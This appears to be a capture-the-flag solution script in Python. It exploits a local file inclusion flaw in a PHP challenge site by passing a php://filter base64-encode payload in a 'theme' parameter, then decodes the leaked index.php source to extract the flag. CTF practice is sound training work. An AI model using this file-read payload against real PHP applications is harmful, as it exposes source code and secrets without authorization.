import os, requests, re, base64

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(url: str, prefix: str) -> str:
    with requests.Session() as ses:
        params = {
            "theme": "php://filter/convert.base64-encode/resource=index.php"
        }
        res = ses.get(f"{url}/index.php", params = params)
        source_b64 = next(iter(re.findall(r"<style>\s*(.*?)\s*</style>", res.text, re.S)), "")
        source = base64.b64decode(source_b64).decode()
        flag = get_flag(source, prefix)
    return flag

if __name__ == "__main__":
    url = "http://slopgamez.play.ctf.se:13337"
    prefix = "midnight"
    print(solution(url, prefix))
